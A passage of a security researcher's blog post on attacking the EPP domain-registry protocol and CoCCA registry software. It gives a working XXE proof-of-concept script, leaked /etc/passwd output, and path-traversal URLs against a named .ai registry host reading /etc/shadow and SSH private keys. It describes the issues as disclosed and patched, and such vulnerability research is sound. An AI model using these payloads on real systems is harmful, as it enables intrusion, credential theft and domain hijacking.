href=\"https://en.wikipedia.org/wiki/.lc\"\u003e.lc\u003c/a\u003e, \u003ca href=\"https://en.wikipedia.org/wiki/.li\"\u003e.li\u003c/a\u003e, \u003ca href=\"https://en.wikipedia.org/wiki/.lt\"\u003e.lt\u003c/a\u003e, \u003ca href=\"https://en.wikipedia.org/wiki/.lu\"\u003e.lu\u003c/a\u003e, \u003ca href=\"https://en.wikipedia.org/wiki/.lv\"\u003e.lv\u003c/a\u003e, \u003ca href=\"https://en.wikipedia.org/wiki/.md\"\u003e.md\u003c/a\u003e, \u003ca href=\"https://en.wikipedia.org/wiki/.me\"\u003e.me\u003c/a\u003e, \u003ca href=\"https://en.wikipedia.org/wiki/.mk\"\u003e.mk\u003c/a\u003e, \u003ca href=\"https://en.wikipedia.org/wiki/.mn\"\u003e.mn\u003c/a\u003e, \u003ca href=\"https://en.wikipedia.org/wiki/.ms\"\u003e.ms\u003c/a\u003e, \u003ca href=\"https://en.wikipedia.org/wiki/.mu\"\u003e.mu\u003c/a\u003e, \u003ca href=\"https://en.wikipedia.org/wiki/.mx\"\u003e.mx\u003c/a\u003e, \u003ca href=\"https://en.wikipedia.org/wiki/.na\"\u003e.na\u003c/a\u003e, \u003ca href=\"https://en.wikipedia.org/wiki/.nf\"\u003e.nf\u003c/a\u003e, \u003ca href=\"https://en.wikipedia.org/wiki/.ng\"\u003e.ng\u003c/a\u003e, \u003ca href=\"https://en.wikipedia.org/wiki/.nl\"\u003e.nl\u003c/a\u003e, \u003ca href=\"https://en.wikipedia.org/wiki/.no\"\u003e.no\u003c/a\u003e, \u003ca href=\"https://en.wikipedia.org/wiki/.nu\"\u003e.nu\u003c/a\u003e, \u003ca href=\"https://en.wikipedia.org/wiki/.nz\"\u003e.nz\u003c/a\u003e (EPP codes referred to as \u003ca href=\"https://en.wikipedia.org/wiki/Unique_Domain_Authentication_Identifier\"\u003eUDAIs\u003c/a\u003e), \u003ca href=\"https://en.wikipedia.org/wiki/.pe\"\u003e.pe\u003c/a\u003e, \u003ca href=\"https://en.wikipedia.org/wiki/.pk\"\u003e.pk\u003c/a\u003e, \u003ca href=\"https://en.wikipedia.org/wiki/.pl\"\u003e.pl\u003c/a\u003e (over HTTPS), \u003ca href=\"https://en.wikipedia.org/wiki/.ps\"\u003e.ps\u003c/a\u003e, \u003ca href=\"https://en.wikipedia.org/wiki/.pt\"\u003e.pt\u003c/a\u003e, \u003ca href=\"https://en.wikipedia.org/wiki/.ru\"\u003e.ru\u003c/a\u003e, \u003ca href=\"https://en.wikipedia.org/wiki/.ro\"\u003e.ro\u003c/a\u003e, \u003ca href=\"https://en.wikipedia.org/wiki/.sc\"\u003e.sc\u003c/a\u003e, \u003ca href=\"https://en.wikipedia.org/wiki/.se\"\u003e.se\u003c/a\u003e, \u003ca href=\"https://en.wikipedia.org/wiki/.sh\"\u003e.sh\u003c/a\u003e, \u003ca href=\"https://en.wikipedia.org/wiki/.si\"\u003e.si\u003c/a\u003e, \u003ca href=\"https://en.wikipedia.org/wiki/.su\"\u003e.su\u003c/a\u003e, \u003ca href=\"https://en.wikipedia.org/wiki/.tl\"\u003e.tl\u003c/a\u003e, \u003ca href=\"https://en.wikipedia.org/wiki/.tm\"\u003e.tm\u003c/a\u003e \u003ca href=\"https://en.wikipedia.org/wiki/.tv\"\u003e.tv\u003c/a\u003e, \u003ca href=\"https://en.wikipedia.org/wiki/.tw\"\u003e.tw\u003c/a\u003e, \u003ca href=\"https://en.wikipedia.org/wiki/.ua\"\u003e.ua\u003c/a\u003e, \u003ca href=\"https://en.wikipedia.org/wiki/.uk\"\u003e.uk\u003c/a\u003e, \u003ca href=\"https://en.wikipedia.org/wiki/.us\"\u003e.us\u003c/a\u003e, \u003ca href=\"https://en.wikipedia.org/wiki/.vc\"\u003e.vc\u003c/a\u003e, \u003ca href=\"https://en.wikipedia.org/wiki/.ve\"\u003e.ve\u003c/a\u003e and \u003ca href=\"https://en.wikipedia.org/wiki/.za\"\u003e.za\u003c/a\u003e as well as \u003ca href=\"https://en.wikipedia.org/wiki/ENUM\"\u003eENUM\u003c/a\u003e registries such as those operating the +31, +41, +43, +44 and +48 country codes.\u003csup\u003e\u003ca href=\"https://en.wikipedia.org/wiki/Extensible_Provisioning_Protocol#cite_note-9\"\u003e[9]\u003c/a\u003e\u003c/sup\u003e\u003c/p\u003e\u003cpre\u003e\u003ccode\u003e▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀\n\u0026#34;Attacking the EPP protocol\u0026#34;\n▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄\u003c/code\u003e\u003c/pre\u003e\u003cp\u003eWhen hacking any system, you cannot make assumptions on its security posture as you will risk not testing certain vulnerability classes. Coming from the web application security angle, our immediate thoughts for targeting this protocol was testing for the presence of \u003ca href=\"https://portswigger.net/web-security/xxe\"\u003eXML external entity injection\u003c/a\u003e.\u003c/p\u003e\u003cp\u003eIn order to do this, we modified a Python EPP client and crafted an XML payload in the correct format. This XML payload contained our XXE attack at the top. From scanning the internet and relying on passive data for IPs with port 700 open, we were able to amass a large list of EPP servers to attempt our research on.\u003c/p\u003e\u003cp\u003eOur proof-of-concept was extremely effective:\u003c/p\u003e\u003cpre\u003e\u003ccode\u003efrom epp import epp_client\nimport sys\n\nip = sys.argv[1]\ntry:\n\tconn = epp_client.EPPConnection(\n\t\thost=ip,\n\t\tport=700,\n\t\tuser=\u0026#39;epp_user_01\u0026#39;,\n\t\tpassword=\u0026#39;some_secret\u0026#39;,\n\t\tverbose=True,\n\t\treturn_soup=True,\n\t)\n\tconn.open()\n\tprint(conn.call(\u0026#34;\u0026lt;?xml version=\\\u0026#34;1.0\\\u0026#34; standalone=\\\u0026#34;no\\\u0026#34;?\u0026gt; \u0026lt;!DOCTYPE foo [ \u0026lt;!ENTITY xxe SYSTEM \\\u0026#34;file:///etc/passwd\\\u0026#34;\u0026gt; ]\u0026gt; \u0026lt;epp xmlns=\\\u0026#34;urn:ietf:params:xml:ns:epp-1.0\\\u0026#34; xmlns:xsi=\\\u0026#34;http://www.w3.org/2001/XMLSchema-instance\\\u0026#34; xsi:schemaLocation=\\\u0026#34;urn:ietf:params:xml:ns:epp-1.0 epp-1.0.xsd\\\u0026#34;\u0026gt; \u0026lt;command\u0026gt; \u0026lt;poll op=\u0026#39;req\u0026#39; /\u0026gt; \u0026lt;clTRID\u0026gt;\u0026amp;xxe;\u0026lt;/clTRID\u0026gt; \u0026lt;/command\u0026gt; \u0026lt;/epp\u0026gt;\u0026#34;.format(ip)))\nexcept:\n\tprint(\u0026#39;failed lol\u0026#39;)\u003c/code\u003e\u003c/pre\u003e\u003cp\u003eRunning this on a vulnerable server yielded the following:\u003c/p\u003e\u003cpre\u003e\u003ccode\u003e\u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34; standalone=\u0026#34;no\u0026#34;?\u0026gt;\u0026lt;html\u0026gt;\u0026lt;body\u0026gt;\u0026lt;epp xmlns=\u0026#34;urn:ietf:params:xml:ns:epp-1.0\u0026#34; xmlns:xsi=\u0026#34;http://www.w3.org/2001/XMLSchema-instance\u0026#34; xsi:schemalocation=\u0026#34;urn:ietf:params:xml:ns:epp-1.0 epp-1.0.xsd\u0026#34;\u0026gt;\u0026lt;response\u0026gt;\u0026lt;result code=\u0026#34;2001\u0026#34;\u0026gt;\u0026lt;msg\u0026gt;Command syntax error\u0026lt;/msg\u0026gt;\u0026lt;extvalue\u0026gt;\u0026lt;value xmlns:epp=\u0026#34;urn:ietf:params:xml:ns:epp-1.0\u0026#34;\u0026gt;\u0026lt;epp:undef\u0026gt;\u0026lt;/epp:undef\u0026gt;\u0026lt;/value\u0026gt;\u0026lt;reason\u0026gt;XML Parser: unknown-55ccdac19830:0: Schemas validity error : Element \u0026#39;{urn:ietf:params:xml:ns:epp-1.0}clTRID\u0026#39;: [facet \u0026#39;maxLength\u0026#39;] The value has a length of \u0026#39;1845\u0026#39;; this exceeds the allowed maximum length of \u0026#39;64\u0026#39;.\nunknown-55ccdac19830:0: Schemas validity error : Element \u0026#39;{urn:ietf:params:xml:ns:epp-1.0}clTRID\u0026#39;: \u0026#39;root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\nlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\nirc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin\ngnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\nsystemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin\nsystemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin\nsyslog:x:102:106::/home/syslog:/usr/sbin/nologin\nmessagebus:x:103:107::/nonexistent:/usr/sbin/nologin\n_apt:x:104:65534::/nonexistent:/usr/sbin/nologin\nsshd:x:105:65534::/run/sshd:/usr/sbin/nologin\nsysadm:x:1000:1000:Unprivileged Administrator Account,,,:/home/sysadm:/bin/bash\nansible:x:1001:1001:ansible user:/home/ansible:/bin/bash\nsssd:x:106:112:SSSD system user,,,:/var/lib/sss:/usr/sbin/nologin\nbareos:x:107:113:bareos,,,:/var/lib/bareos:/usr/sbin/nologin\nnagios:x:108:114::/var/lib/nagios:/usr/sbin/nologin\nstunnel4:x:109:115::/var/run/stunnel4:/usr/sbin/nologin\nntp:x:110:116::/nonexistent:/usr/sbin/nologin\n_lldpd:x:111:117::/var/run/lldpd:/usr/sbin/nologin\npostfix:x:112:119::/var/spool/postfix:/usr/sbin/nologin\n\u0026#39; is not a valid value of the atomic type \u0026#39;{urn:ietf:params:xml:ns:epp-1.0}trIDStringType\u0026#39;.\n\u0026lt;/reason\u0026gt;\u0026lt;/extvalue\u0026gt;\u0026lt;/result\u0026gt;\u0026lt;trid\u0026gt;\u0026lt;svtrid\u0026gt;RO-549-1682827377068386\u0026lt;/svtrid\u0026gt;\u0026lt;/trid\u0026gt;\u0026lt;/response\u0026gt;\u0026lt;/epp\u0026gt;\u003c/code\u003e\u003c/pre\u003e\u003cp\u003eSurprisingly, we saw a large number of EPP servers vulnerable to this simple XXE attack. We received over 50 callbacks to our Burp Collaborator server, and in the process of investigating these, we started to see a pattern. Most of the EPP servers that were vulnerable to this were running a registry software named \u003ca href=\"https://cocca.org.nz/srs/\"\u003eCoCCA Registry Software\u003c/a\u003e.\u003c/p\u003e\u003cp\u003eThis software allows registries to bootstrap their operations and provides all the functionalities needed for them to operate a TLD/ccTLD. This software has been instrumental in the proliferation of smaller ccTLDs as they often do not have the resources to build all of these functionalities themselves.\u003c/p\u003e\u003cp\u003eOften, ccTLDs are managed by small teams and sometimes this work is outsourced to Universities or private individuals. We sometimes do not recognize the sparseness of resources when it comes to our global internet infrastructure. \u003c/p\u003e\u003cpre\u003e\u003ccode\u003e▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀\n\u0026#34;Exploring the CoCCA Registry Software\u0026#34;\n▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄\u003c/code\u003e\u003c/pre\u003e\u003cp\u003eThe registry software includes a web application that is used to manage the registry, as well as an in-built EPP server where we discovered our XXE in. This application is written purely in Java, backed by a Postgres database.\u003c/p\u003e\u003cp\u003eWe were quickly able to identify the root cause of the XXE when looking at the \u003ccode\u003eEppConnection.java\u003c/code\u003e class, which initialised an XML reader through the following code:\u003c/p\u003e\u003cpre\u003e\u003ccode\u003e/*     */   public EppConnection() {\n/*     */     try {\n/* 106 */       DocumentBuilderFactory dFactory = DocumentBuilderFactory.newInstance();\n/* 107 */       dFactory.setNamespaceAware(true);\n/* 108 */       dFactory.setIgnoringElementContentWhitespace(true);\n/* 109 */       this.dBuilder = dFactory.newDocumentBuilder();\n/*     */       \n/* 111 */       TransformerFactory tFactory = TransformerFactory.newInstance();\n/* 112 */       this.transformer = tFactory.newTransformer();\n/* 113 */       this.transformer.setOutputProperty(\u0026#34;encoding\u0026#34;, \u0026#34;UTF-8\u0026#34;);\n/* 114 */     } catch (ParserConfigurationException e) {\n/* 115 */       e.printStackTrace(System.out);\n/* 116 */     } catch (TransformerConfigurationException e) {\n/* 117 */       e.printStackTrace(System.out);\n/*     */     } \n/*     */   }\u003c/code\u003e\u003c/pre\u003e\u003cp\u003eAs you can see above, the document builder factory that is used for all XML processing has not been set up to ignore external entities or DTDs. Due to this, any XML processing done by the in-built EPP server was vulnerable to XXE.\u003c/p\u003e\u003cp\u003eThe below XXE payload will successfully fire when the EPP server processes our XML:\u003c/p\u003e\u003cpre\u003e\u003ccode\u003e\u0026lt;?xml version=\u0026#34;1.0\u0026#34; standalone=\u0026#34;no\u0026#34;?\u0026gt; \u0026lt;!DOCTYPE foo [ \u0026lt;!ENTITY xxe SYSTEM \u0026#34;file:///etc/passwd\u0026#34;\u0026gt; ]\u0026gt; \u0026lt;epp xmlns=\u0026#34;urn:ietf:params:xml:ns:epp-1.0\u0026#34; xmlns:xsi=\u0026#34;http://www.w3.org/2001/XMLSchema-instance\u0026#34; xsi:schemaLocation=\u0026#34;urn:ietf:params:xml:ns:epp-1.0 epp-1.0.xsd\u0026#34;\u0026gt; \u0026lt;command\u0026gt; \u0026lt;poll op=\u0026#39;req\u0026#39; /\u0026gt; \u0026lt;clTRID\u0026gt;\u0026amp;xxe;\u0026lt;/clTRID\u0026gt; \u0026lt;/command\u0026gt; \u0026lt;/epp\u0026gt;\u003c/code\u003e\u003c/pre\u003e\u003cp\u003eThis example was also utilized in our simple checker script above in this blog post, and the SYSTEM entity can be changed to a Burp Collaborator URL to capture out of bound hits.\u003c/p\u003e\u003cp\u003eWhile the XXE was an impactful finding, we became curious about the security posture of this registry software as it is used so heavily to operate a significant portion of the internet as we know it.\u003c/p\u003e\u003cp\u003eChecking the \u003ccode\u003eweb.xml\u003c/code\u003e file, we started mapping out pre-authentication routes until we came across the following servlet definition:\u003c/p\u003e\u003cpre\u003e\u003ccode\u003e\t\u0026lt;!-- Cities servlet for contact create --\u0026gt;\n\t\u0026lt;servlet\u0026gt;\n\t\t\u0026lt;servlet-name\u0026gt;CitiesServlet\u0026lt;/servlet-name\u0026gt;\n\t\t\u0026lt;servlet-class\u0026gt;cx.cocca.utils.CitiesServlet\n\t\t\u0026lt;/servlet-class\u0026gt;\n\t\u0026lt;/servlet\u0026gt;\n\t\u0026lt;servlet-mapping\u0026gt;\n\t\t\u0026lt;url-pattern\u0026gt;/cities\u0026lt;/url-pattern\u0026gt;\n\t\t\u0026lt;servlet-name\u0026gt;CitiesServlet\u0026lt;/servlet-name\u0026gt;\n\t\u0026lt;/servlet-mapping\u0026gt;\u003c/code\u003e\u003c/pre\u003e\u003cp\u003eThe code for this servlet contained a local file disclosure vulnerability:\u003c/p\u003e\u003cpre\u003e\u003ccode\u003epublic class CitiesServlet extends HttpServlet {\n  private static final Log log = LogFactoryImpl.getLog(cx.cocca.utils.CitiesServlet.class);\n  \n  private static final String FILE = \u0026#34;/cities/cities_\u0026#34;;\n  \n  protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {\n    String country = req.getParameter(\u0026#34;country\u0026#34;);\n    String fileName = \u0026#34;/cities/cities_\u0026#34; + country;\n    log.debug(\u0026#34;File name is \u0026#34; + fileName);\n    try (InputStream is = getClass().getResourceAsStream(fileName)) {\n      StringBuilder sb = new StringBuilder(\u0026#34;{\\\u0026#34;cities\\\u0026#34;: [\u0026#34;);\n      if (is != null) {\n        List\u0026lt;String\u0026gt; cities = IOUtils.readLines(is, \u0026#34;UTF-8\u0026#34;);\n        boolean first = true;\n        for (String city : cities) {\n          if (!first)\n            sb.append(\u0026#34;, \u0026#34;); \n          sb.append(\u0026#34;\\\u0026#34;\u0026#34;);\n          sb.append(city);\n          sb.append(\u0026#34;\\\u0026#34;\u0026#34;);\n          first = false;\n        } \n      } \n      sb.append(\u0026#34;]}\u0026#34;);\n      resp.setContentType(\u0026#34;application/json\u0026#34;);\n      resp.getWriter().println(sb.toString());\n    } catch (Exception e) {\n      log.error(\u0026#34;Error loading cities\u0026#34;, e);\n    } \n  }\n}\u003c/code\u003e\u003c/pre\u003e\u003cfigure\u003e\u003cimg src=\"https://hackcompute.com/content/images/2023/05/image.png\" alt=\"\" loading=\"lazy\" width=\"1933\" height=\"993\" srcset=\"https://hackcompute.com/content/images/size/w600/2023/05/image.png 600w, https://hackcompute.com/content/images/size/w1000/2023/05/image.png 1000w, https://hackcompute.com/content/images/size/w1600/2023/05/image.png 1600w, https://hackcompute.com/content/images/2023/05/image.png 1933w\" sizes=\"(min-width: 720px) 720px\"/\u003e\u003c/figure\u003e\u003cp\u003eWe were able to chain the XXE vulnerability with this local file disclosure vulnerability to obtain any file on the local system. \u003c/p\u003e\u003cp\u003eThe XXE provided us the ability to understand the file and folder structure of the underlying system and this local file disclosure vulnerability let us easily and cleanly download any file on the system. \u003c/p\u003e\u003cp\u003eThe XXE can also be used to exfiltrate files, and through the \u003ca href=\"https://github.com/ONsec-Lab/scripts/blob/master/xxe-ftp-server.rb\"\u003eFTP trick\u003c/a\u003e, it is possible to obtain files that contain new lines or control characters.\u003c/p\u003e\u003cp\u003eGiven that we could access the \u003ccode\u003e/etc/shadow\u003c/code\u003e file on most servers running this software, it was clear to us that we could access any file on the filesystem, and the application was probably running as root (!!). \u003c/p\u003e\u003cpre\u003e\u003ccode\u003e▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀\n\u0026#34;Proving Impact\u0026#34;\n▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄\u003c/code\u003e\u003c/pre\u003e\u003cp\u003eNow that we\u0026#39;ve established the ground work to be able to compromise servers running the CoCCA registry software, how much damage could an attacker really do?\u003c/p\u003e\u003cp\u003eFor the purposes of proving the impact, and given the rise of AI, we focused our efforts on the \u003ccode\u003e.AI\u003c/code\u003e ccTLD. The following files were able to be obtained through the vulnerabilities we discovered:\u003c/p\u003e\u003cpre\u003e\u003ccode\u003ehttps://epp.whois.ai/cities?country=/../../../../../../../../etc/shadow\nhttps://epp.whois.ai/cities?country=/../../../../../../../../home/vince/.ssh/known_hosts\nhttps://epp.whois.ai/cities?country=/../../../../../../../../opt/resin/log/oteaccess.log\nhttps://epp.whois.ai/cities?country=/../../../../../../../../home/garth_cocca/.bash_history\nhttps://epp.whois.ai/cities?country=/../../../../../../../../opt/resin/conf/resin.xml\nhttps://epp.whois.ai/cities?country=/../../../../../../../../root/.psql_history\nhttps://epp.whois.ai/cities?country=/../../../../../../../../home/vince/.ssh/id_rsa\u003c/code\u003e\u003c/pre\u003e\u003cp\u003eWe discovered that one of the maintainers of the \u003ccode\u003e.AI\u003c/code\u003e registry is a person named Vince. Given that the files obtained via this vulnerability gave us his SSH private key, we validated that we could login to his server, which contained several GPG encrypted backups of the entire .AI registry.\u003c/p\u003e\u003cp\u003eWe got in touch with Vince, and he thankfully put us in touch with the relevant people as well as acted diligently in resolving the vulnerabilities on his systems. Temporarily taking them offline while a fix was made available.\u003c/p\u003e\u003cp\u003eSpeaking with Vince (the administrator of the .ai zone) over WhatsApp, we confirmed that compromising this server would give us full control over any .ai domain:\u003c/p\u003e\u003cfigure\u003e\u003cimg src=\"https://hackcompute.com/content/images/2023/05/image-4.png\" alt=\"\" loading=\"lazy\" width=\"360\" height=\"780\"/\u003e\u003c/figure\u003e\u003cp\u003eThe impact unfortunately does not stop there, in the process of reading files from various registry servers running CoCCA, we discovered a file called \u003ca href=\"https://registry.nic.shia/cities?country=/../../../../../../../../root/upload-files-box-com.sh\" rel=\"noreferrer noopener\"\u003e\u003ccode\u003eupload-files-box-com.sh\u003c/code\u003e\u003c/a\u003e.\u003c/p\u003e\u003cp\u003eAs the filename suggests, this script was responsible for taking a full database backup and uploading them to a central box.com account. We validated that these credentials were valid and led to the ability to compromise almost every major ccTLD that was running the CoCCA application:\u003c/p\u003e\u003cfigure\u003e\u003cimg src=\"https://hackcompute.com/content/images/2023/05/image-1.png\" alt=\"\" loading=\"lazy\" width=\"1002\" height=\"791\" srcset=\"https://hackcompute.com/content/images/size/w600/2023/05/image-1.png 600w, https://hackcompute.com/content/images/size/w1000/2023/05/image-1.png 1000w, https://hackcompute.com/content/images/2023/05/image-1.png 1002w\" sizes=\"(min-width: 720px) 720px\"/\u003e\u003cfigcaption\u003eOh no....\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003eThese database backups are essentially game over. Once administrative access is gained to the CoCCA application, it is possible to control the nameservers for every domain for that ccTLD. Additional impact included the ability to transfer domains that don\u0026#39;t belong to you.\u003c/p\u003e\u003cp\u003eAll of this was communicated to the affected parties and all of the EPP servers running the CoCCA software that were managed by this central entity have been patched. Whether or not they are still uploading all the database backups to a central box.com account is unknown, but it is clear that the internet is so, so brittle.\u003c/p\u003e\u003cp\u003eThe latest version of the CoCCA software contains patches for all of the vulnerabilities we discovered.\u003c/p\u003e\u003cpre\u003e\u003ccode\u003e▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀\n\u0026#34;Future Work\u0026#34;\n▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄\u003c/code\u003e\u003c/pre\u003e\u003cp\u003eWhile we looked at CoCCA in detail, there are two other major registry software that we are aware of where the source code has been made available.\u003c/p\u003e\u003cp\u003e\u003ca href=\"https://github.com/google/nomulus\"\u003eNomulus\u003c/a\u003e, registry software created and used by Google. You can find this software in production, here: \u003ca href=\"https://domain-registry.appspot.com\"\u003edomain-registry.appspot.com\u003c/a\u003e\u003c/p\u003e\u003cp\u003eFortunately, \u003ca href=\"https://github.com/google/nomulus/blob/79ba1b94c4102ccb2ae25f48c6961365cb426ac6/core/src/main/java/google/registry/xml/XmlTransformer.java#L113\"\u003eGoogle\u0026#39;s defensive programming\u003c/a\u003e, prevented them from being vulnerable to XXE via EPP messages:\u003c/p\u003e\u003cpre\u003e\u003ccode\u003e  private static XMLInputFactory createInputFactory() throws FactoryConfigurationError {\n    // Prevent XXE attacks.\n    XMLInputFactory xmlInputFactory = XMLInputFactory.newFactory();\n    xmlInputFactory.setProperty(XMLInputFactory.IS_SUPPORTING_EXTERNAL_ENTITIES, false);\n    xmlInputFactory.setProperty(XMLInputFactory.SUPPORT_DTD, false);\n    return xmlInputFactory;\n  }\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003eWe spent a significant amount of time on Google\u0026#39;s registry software and discovered an endpoint that we believe are not supposed to be accessed without authentication, but given that we couldn\u0026#39;t prove much security impact, it was not reported to Google.\u003c/p\u003e\u003cp\u003eAnother registry software that could be a great research target is \u003ca href=\"https://fred.nic.cz/documentation/html/Architecture/Deployment.html#web-node\"\u003eFred\u003c/a\u003e, which is managed by the team at nic.cz. It is being used by a lot of different registries, and any pre-authentication vulnerability in this could be critical to the domain infrastructure for the following ccTLDs:\u003c/p\u003e\u003cfigure\u003e\u003cimg src=\"https://hackcompute.com/content/images/2023/05/image-2.png\" alt=\"\" loading=\"lazy\" width=\"2000\" height=\"1067\" srcset=\"https://hackcompute.com/content/images/size/w600/2023/05/image-2.png 600w, https://hackcompute.com/content/images/size/w1000/2023/05/image-2.png 1000w, https://hackcompute.com/content/images/size/w1600/2023/05/image-2.png 1600w, https://hackcompute.com/content/images/size/w2400/2023/05/image-2.png 2400w\" sizes=\"(min-width: 720px) 720px\"/\u003e\u003c/figure\u003e\u003cpre\u003e\u003ccode\u003e▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀\n\u0026#34;Closing Notes\u0026#34;\n▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄\u003c/code\u003e\u003c/pre\u003e\u003cp\u003eWe thank the CoCCA team for fixing all the issues we identified, Vince from nic.ai, and Mike Damm from Zuffix Domains.\u003c/p\u003e\n      \u003c/section\u003e\n\n      \u003cbr/\u003e\n\n      \n\n\n\n  \u003c/article\u003e\n\u003c/div\u003e\u003c/div\u003e",
  "readingTime": "21 min read",
  "publishedTime": "2023-06-12T04:13:00Z",
  "modifiedTime": "2023-06-13T12:37:57Z"
}
